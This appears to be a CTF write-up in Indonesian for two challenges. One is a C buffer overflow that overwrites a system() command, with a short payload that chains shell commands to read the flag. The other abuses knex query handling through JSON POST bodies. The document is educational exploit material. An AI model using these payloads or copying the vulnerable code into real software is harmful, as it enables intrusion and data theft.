# pwn
## ez-pwn-1
### tldr;
dikasih source code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


int main()
{
    char command[16];
    char way_too_small_input_buf[8];
    strcpy(command, "ls");

    puts("Hi! would you like me to ls the current directory?");
    read(0, way_too_small_input_buf, 24);
    if (!strcmp(way_too_small_input_buf, "no\n")) {
        puts("Oh, ok :(");
        exit(0);
    }

    puts("Ok, here ya go!\n");
    system(command);

}
```

tinggal bof biasa payload: aaaabaaacd th*;ls;cat f*

flag: flag{congrats_youve_exploited_a_memory_corruption_vulnerability}

# web
## xark
Pada challenge in kita diberikan source code berupa js program.
```js
...snip...
const app = express();
const port = 3001;
const knex = require('knex')(config.get('knex'));
...snip...
```

program ini menggunakan knex sebagai module untuk mengurus query mysql program ini.
https://github.com/knex/knex/issues/1227 

![](Pasted%20image%2020221121074939.png)

TL;DR knex mempunyai sebuah vulnerability lama, dimana kita bisa merubah query dari program knex menggunakan application/json post requests. Jadi semisal kita membuat query seperti dibawah ini:

```json
{"to": {"message":"the flag is here!"}}
```

maka akan menjadi

![](Pasted%20image%2020221121075018.png)

#### exploitation
Jadi untuk mendapatkan flag yang terdapat di query di bawah ini:

```js
...snip...
        knex('crushes').insert({
            from: config.init.flag,
            to: config.init.flag,
            message: 'This is the flag!',
        }).then();
    }
});
...snip...
```

kita bisa melakukan post request application/json di endpoint POST /data HTTP/1.1

![](Pasted%20image%2020221121075102.png)

